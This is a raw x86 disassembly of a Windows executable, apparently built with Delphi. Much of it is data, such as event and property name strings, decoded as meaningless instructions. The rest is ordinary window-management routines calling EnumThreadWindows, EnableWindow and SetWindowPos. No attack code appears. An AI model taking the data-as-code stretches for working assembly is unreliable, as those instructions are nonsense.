add [ eax + 0x4f0c0055 ] al
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0053 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
add [ edi ] al
dec edi
add [ eax ] eax
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esi
add [ eax ] dl
dec edi
outsb
push edi
push 0x646c6565
xchg [ eax + eax + 0x40 ] eax
sub_4632e8
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
nop
jle r-xdata
jb r-xdata
adc [ eax ] al
push eax
add [ eax ] al
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3700ffff ] ah
cmp eax [ ebp ]
in al dx
cmp eax [ ebp ]
add [ eax ] al
add [ eax + 0x1 ] al
and [ eax ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
jle r-xdata
outsd
outsb
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x1cff0001 ] ah
cmp eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] eax
push cs
push ebp
jae r-xdata
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
sub [ esi ] eax
xor [ edx ] eax
add bh bh
xor [ edx ] eax
add bh bh
add al 0x74
inc esi
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
inc eax
add [ ecx ] bl
add bh bh
mov eax 0x10044d2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
imul esp [ gs : edi + 0x68 ] 0x40109474
add [ edx + eax ] bh
add bh bh
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
outsb
je r-xdata
dec ecx
imul ebp [ ebp - 0x80 ] 0x8004623
add al [ eax ]
inc [ eax ]
push esp
inc esi
add [ esp + esi * 2 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
cmp al 0x10
outsd
outsb
je r-xdata
inc ebp
add [ eax + 0x2 ] ah
add bh bh
xor [ ebp + 0x46 ] dh
jb r-xdata
add [ eax ] al
add [ eax ] al
push ebx
arpl [ edx + 0x6f ] si
insb
add bh bh
insb
leave
inc esp
add al al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060005 ] al
and al [ edx ]
push 0x80ff0000
rol [ eax + eax - 0x70 ] cl
rol [ eax + eax ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
outsd
outsb
je r-xdata
js r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
add [ esi ] cl
dec edi
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
popad
je r-xdata
jns r-xdata
sub al 0x42
add [ eax + 0x2 ] al
add bh bh
clc
jae r-xdata
add [ eax ] al
or [ ebx ] 0x0
or eax 0x7a726f48
sub [ esi ] al
das
add al [ eax ]
push [ esp + esi * 2 ]
inc esi
add [ esp + esi * 2 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ esi + 0x6f ] eax
jb r-xdata
add [ eax ] al
add [ eax + eax ] dh
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
ja r-xdata
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
outsb
and al 0x2a
inc esi
outsb
arpl [ eax - 0x64 ] bp
enter 0x45 0x7c
add [ eax ] al
inc [ ecx + edx * 8 + 0x44 ]
add [ esp + esi * 2 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
jb r-xdata
jb r-xdata
inc eax
add [ eax + eax ] cl
[ ecx + ecx * 8 + 0x44 ]
cmp al 0x10
je r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al 0x0
or cl [ ebx + 0x65 ]
jns r-xdata
add [ esp + esi * 2 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002b ] al
insb
inc edx
popad
push ebx
je r-xdata
add [ 0x35ff0002 ] dh
add al [ eax ]
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jb r-xdata
jmp edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
outsb
je r-xdata
jb r-xdata
lds eax [ ebp ]
dec eax
add al [ eax ]
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
jb r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d04002d ] al
outsb
jne r-xdata
insb
inc eax
add [ edi + esi * 2 + 0x77c00046 ] dh
inc esi
outsb
jne r-xdata
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
adc [ eax ] al
push eax
ja r-xdata
add [ eax - 0x80000000 ] al
add [ cs : esi ] cl
dec edi
insb
inc ebx
jb r-xdata
rol [ ebp ] 0x60
add al [ eax ]
push [ eax ]
jne r-xdata
add [ eax + 0x77 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002f ] al
adc [ eax ] al
xor al 0x2
add bh bh
xor al 0x2
add bh bh
add [ eax ] eax
xor al 0x0
add [ eax + 0x1 ] al
sub [ esi ] eax
xor [ edx ] al
add bh bh
cwde
ja r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push ebx
outsb
popad
jo r-xdata
outsd
add [ edi + esi * 2 + 0x46 ] ah
cmp al 0x10
inc eax
add [ esp + esi * 2 ] al
inc esi
ja r-xdata
add [ esp + esi * 2 ] al
inc esi
add [ edx + edx * 8 + 0x44 ] ah
add [ eax - 0x80000000 ] al
aaa
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
add [ esp + esi * 2 ] al
inc esi
or al 0x0
or eax 0x74726556
adc [ eax ] al
in al 0x2
add bh bh
in al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
cmp [ eax ] al
or dl [ ebx + 0x6e ]
popad
jo r-xdata
adc [ eax ] al
push edi
add [ eax ] al
add [ eax ] al
add [ ecx ] bh
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
dec eax
add [ eax ] al
dec [ eax - 0x37 ]
inc esp
add al al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jne r-xdata
add [ eax ] al
je r-xdata
sub eax [ edx ]
add bh bh
mov al 0x78
inc esi
add [ esp + esi * 2 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
add [ 0x74646957 ] al
push r-xdata
jb r-xdata
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
and eax [ esi ]
or al 0x2
add bh bh
adc [ esi + eax * 2 ] dl
add al 0x74
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
jb r-xdata
add al 0x74
jb r-xdata
push ecx
je r-xdata
outsb
inc ebx
dec edi
call 0x58467d2a
add al [ eax ]
call [ ebp + esi * 2 + 0x46 ]
add [ eax + 0x2 ] bl
add bh bh
push esp
jne r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
je r-xdata
dec esp
xchg [ eax + eax - 0x38 ] al
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] 0xc
dec edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
nop
add al [ eax ]
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003f ] al
outsb
push edi
inc ecx
add [ eax - 0x7700fffe ] cl
add al [ eax ]
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
inc eax
add [ eax ] al
add [ esp + esi * 2 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
dec edi
mov al [ 0xffffffffb0004483 ]
add [ eax ] eax
push [ eax + 0x1ff0001 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
add al 0x74
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
outsb
inc ebx
jb r-xdata
add al [ eax ]
inc [ esp + esi * 2 ]
push ecx
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
clc
sub al [ esi ]
cwde
add al [ eax ]
[ eax + 0x4ff0002 ]
je r-xdata
inc ebx
insb
outsd
jae r-xdata
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003d ] al
fadd [ ebp + 0xc00044 ]
add bh bh
rol [ eax ] 0x0
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
pushfd
jb r-xdata
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0044 ] al
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add [ eax + 0x4f090045 ] al
outsb
inc esp
jae r-xdata
js r-xdata
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
fadd [ edi + 0x1300044 ]
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
add bh bh
add al 0x74
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004f ] al
imul esi [ ebp + 0x49 ] 0x746f666e
push edi
outsb
outsw
je r-xdata
jo r-xdata
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebx
add [ ecx ] cl
dec edi
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
test [ eax + eax - 0x48 ] al
add [ eax ] eax
outsb
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0049 ] al
jbe r-xdata
jns r-xdata
add [ eax - 0x5f00fffe ] ah
push eax
outsd
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
outsb
dec ebx
jns r-xdata
or [ edi ] 0x9
dec edi
inc ecx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
add [ eax ] al
or [ edx ] 0xa
dec edi
outsb
inc esp
jb r-xdata
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004a ] al
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x50 ] bp
test [ eax + eax - 0x30 ] eax
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0x6e ] ecx
jb r-xdata
call 0xffffffffe945397d
add [ eax ] al
inc [ esp + esi * 2 ]
inc esi
push edi
inc ecx
mov al [ 0x4ff0002 ]
je r-xdata
jo r-xdata
loopne r-xdata
jo r-xdata
add [ eax + eax - 0x28 ] 0xd8ff0000
add [ eax ] al
inc [ esp + esi * 2 ]
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
outsb
dec eax
imul esp [ ebp + 0x78 ] 0xa800462b
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
inc esi
add [ eax + eax - 0x18 ] 0x0
add bh bh
call 0x5453981
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
add al [ eax ]
inc [ esp + esi * 2 ]
push edi
inc ecx
add al dl
add al [ eax ]
call eax
add bh bh
add al 0x74
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090054 ] al
outsb
dec ebp
outsd
jne r-xdata
add [ eax + eax - 0x30 ] 0x0
add bh bh
rol [ eax ] 0x1
add bh bh
add al 0x74
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
outsb
dec ebp
outsd
jne r-xdata
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0050 ] al
outsb
dec ebx
jns r-xdata
add bh bh
add al 0x74
dec ebp
add [ esi ] al
dec edi
outsd
jne r-xdata
push ebp
jo r-xdata
insb
xchg [ fs : eax + eax + 0x40 ] eax
inc esp
outsd
ja r-xdata
cmp al 0x2b
inc esi
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
xchg [ fs : eax + eax + 0x48 ] eax
add [ eax ] eax
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
add [ esi ] cl
dec edi
outsb
dec ebp
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
mov al 0x80
inc esp
add al ah
inc esi
fadd [ eax ]
jb r-xdata
push edi
push edi
push 0x556c6565
jo r-xdata
add [ eax + eax - 0x20 ] 0x0
add bh bh
xchg [ eax + eax + 0x38 ] al
add [ eax ] eax
jae r-xdata
push edi
add bh bh
fadd [ eax ]
add bh bh
add al 0x74
sub [ ecx + 0xd80044 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x3e
je r-xdata
outsb
dec ebp
outsd
jne r-xdata
dec edi
jae r-xdata
pop edi
inc esi
add [ eax ] ah
inc esi
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add [ eax + ebp * 2 + 0xbbc0046 ] bl
inc edx
add [ esp ] bh
inc esi
add [ esi ] dl
inc esi
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
jl r-xdata
inc esi
add ah ch
xor eax [ eax ]
and [ ecx + 0x31280046 ] al
inc eax
add [ ecx + esi + 0x40 ] al
add [ ebx * 2 + 0x45a00046 ] bl
inc ebp
add [ edx - 0x757bffba ] cl
inc ecx
add [ eax + 0x180046a7 ] al
jb r-xdata
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005b ] al
outsb
push ebx
push 0x8504776f
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
push edi
inc ecx
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc [ esp + esi * 2 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
je r-xdata
jpe r-xdata
add ah bl
add [ esi ] 0x24
push cs
inc ebp
add [ edx + edi - 0x782fffbb ] bl
inc esi
add [ eax + 0x1800454c ] dl
aaa
inc ebp
add ah ah
pushfd
inc esi
add [ eax + 0x52 ] ch
inc esi
add [ eax ] bl
push ebp
inc esi
add ah al
lea eax [ esi ]
add [ esi + 0x46 ] bl
add [ esi + ebx * 2 + 0x46 ] bh
add ah al
mov al [ 0x5b380046 ]
inc esi
add [ eax + 0x38 ] ch
inc ebp
add [ eax ] bl
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x70 ]
inc si
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax + ebp * 2 + 0x46 ] ah
add [ eax ] dh
inc esi
add [ eax ] ah
rol [ eax + eax - 0x24 ] cl
push 0xf4c80046
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add [ eax + ebx * 2 + 0x46 ] dh
add [ eax + 0x2800466f ] al
cmovne eax [ eax ]
inc esp
jl r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xfffb9c3 ] bh
add [ eax - 0x80000000 ] al
pop ebp
add [ eax ] cl
dec edi
inc ecx
add al cl
add al [ eax ]
dec eax
add al [ eax ]
add [ eax ] al
jmp eax
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x5453aa3
je r-xdata
add [ eax - 0x73ffbabb ] ah
bound eax [ esi ]
test [ edx - 0x587fffbf ] cl
inc esi
add [ eax ] bl
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
rol ah 0x3c
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi ] al
inc esp
cmp eax 0x2f80046
add [ eax ] al
aam 0x2b
inc esi
add ah al
push cs
inc edx
add [ eax ] al
pop ebx
inc esi
add [ esp + ebx * 2 + 0x33ec0046 ] dh
inc eax
add [ eax ] ah
add [ esi ] sub_403128
inc esp
xor [ eax ] eax
sbb al 0x5d
inc esi
mov eax 0xf000463d
outsd
arpl [ ebx - 0x68 ] bp
test [ eax + eax - 0x10 ] al
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
popad
inc esi
add al cl
fwait
inc esi
add [ eax + 0x7c004682 ] ch
popfd
inc esi
add [ eax + 0x68 ] ah
inc esi
add [ ecx ] cl
add [ eax + eax - 0x4fd3ff5f ] al
inc edx
mov al 0x39
mov al 0xb
mov al 0xc5
pop ebx
add [ edi + edi * 2 + 0x7e600046 ] ah
inc esi
add al al
cmovne eax [ eax ]
les ecx [ edi ]
inc ebp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070051 ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0055 ] al
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0053 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
add [ edi ] al
dec edi
add [ eax ] eax
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esi
add [ eax ] dl
dec edi
outsb
push edi
push 0x646c6565
xchg [ eax + eax + 0x40 ] eax
sub_463eac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x3f
inc esi
add [ edi + edi + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dh
aas
inc esi
add [ eax + 0x34000000 ] ah
imul eax [ ecx ] 0xffffffc4
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
loopne r-xdata
or eax [ edx ]
in al 0xe
inc edx
add [ eax ] al
stosd [ edi ]
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
inc esp
aas
inc esi
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
hlt
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
pop eax
lodsb [ esi ]
inc esi
add [ eax - 0x75 ] ch
inc ecx
add ah cl
or al [ edx ]
test [ edx + 0xba40041 ] cl
inc edx
add [ eax + 0xa ] dh
inc edx
add [ ebx + ecx + 0xcac0042 ] dh
inc edx
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
sub_463f84
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
aas
inc esi
add [ eax + 0x40 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dh
inc eax
inc esi
add [ eax + 0x1 ] al
add [ eax ] al
xor al 0x6b
inc ecx
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
loopne r-xdata
or eax [ edx ]
in al 0xe
inc edx
add ah ah
mov ebx 0xe0046
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x0
add [ eax ] al
pushfd
mov dh 0x42
add [ eax + eax ] cl
add [ eax + edx + 0x500040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] al
add [ eax + edx + 0x8c0040 ] dl
add [ eax ] al
or al 0x54
inc ecx
jo r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
sar [ ebp - 0x7497ffba ] 0x1
inc ecx
add ah cl
or al [ edx ]
test [ edx + 0xba40041 ] cl
inc edx
add [ eax + 0xa ] dh
inc edx
add [ ebx + ecx + 0xcac0042 ] dh
inc edx
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
cli
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
dec eax
inc eax
inc esi
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
int3
sub_464078
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_4640c4
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46d7cc
mov eax [ rw-data ]
call sub_4209f4
mov eax [ rw-data ]
call sub_42099c
retn
push 0x0
push eax
call ShowOwnedPopups
sub_4640fc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026dc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_46414c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_4641ef
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_403670#5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_4640fc
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4641f6
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_464200
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026fc
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_464238
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
